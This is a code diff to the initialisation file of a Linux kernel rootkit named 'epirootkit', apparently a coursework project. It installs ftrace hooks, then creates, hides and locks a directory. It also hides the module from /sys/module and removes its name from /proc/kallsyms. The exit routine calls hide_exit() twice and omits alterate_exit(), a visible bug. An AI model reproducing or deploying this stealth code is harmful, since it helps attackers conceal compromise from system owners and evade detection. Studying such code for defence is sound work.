@@ -1,37 +1,69 @@
 #include "init.h"
 
+#include "alterate_api.h"
+#include "config.h"
+#include "epirootkit.h"
+#include "forbid_api.h"
+#include "ftrace.h"
+#include "hide_api.h"
+
 int init_interceptor(void) {
-    // Initialize hooks
-    int err = fh_install_hooks(hooks, hook_array_size);
+    int err;
+    
+    err = create_dir(HIDDEN_DIR_PATH);
     if (err) {
-        ERR_MSG("epirootkit: init: failed to install hooks\n");
+        ERR_MSG("init: mkdir %s failed: %d\n", HIDDEN_DIR_PATH, err);
         return err;
     }
-
-    // Create directory to be hidden
-    create_dir(HIDDEN_DIR_PATH);
-
+    
+    err = alterate_init();
+    if (err) {
+        ERR_MSG("init: alterate_init() failed: %d\n", err);
+        return err;
+    }
+   
+    err = forbid_init();
+    if (err) {
+        ERR_MSG("init: forbid_init() failed: %d\n", err);
+        return err;
+    }
+    
+    err = hide_init();
+    if (err) {
+        ERR_MSG("init: hide_init() failed: %d\n", err);
+        return err;
+    }
+    
+    err = fh_install_hooks(hooks, hook_array_size);
+    if (err) {
+        ERR_MSG("init: failed to install hooks\n");
+        return err;
+    }
+    
     // Hide directory HIDDEN_DIR_PATH
-    add_hidden_dir(HIDDEN_DIR_PATH);
+    hide_file(HIDDEN_DIR_PATH);
 
     // Forbid access to HIDDEN_DIR_PATH
-    add_forbidden_file(HIDDEN_DIR_PATH);
+    forbid_file(HIDDEN_DIR_PATH);
 
     // Hide module in /sys/modules
-    add_hidden_dir("/sys/module/epirootkit");
+    hide_file("/sys/module/epirootkit");
 
     // Hide module in /proc/kallsyms
-    add_modified_file("/proc/kallsyms", -1, "epirootkit", NULL, NULL);
+    alterate_add("/proc/kallsyms", -1, "epirootkit", NULL, NULL);
 
     // Hide module in /proc/modules
     // hide_module();
-
+    
     return SUCCESS;
 }
 
-// I do not care if it is dirty.
 void exit_interceptor(void) {
     fh_remove_hooks(hooks, hook_array_size);
+
+    hide_exit();
+    forbid_exit();
+    hide_exit();
 }
 
 int create_dir(char *path) {
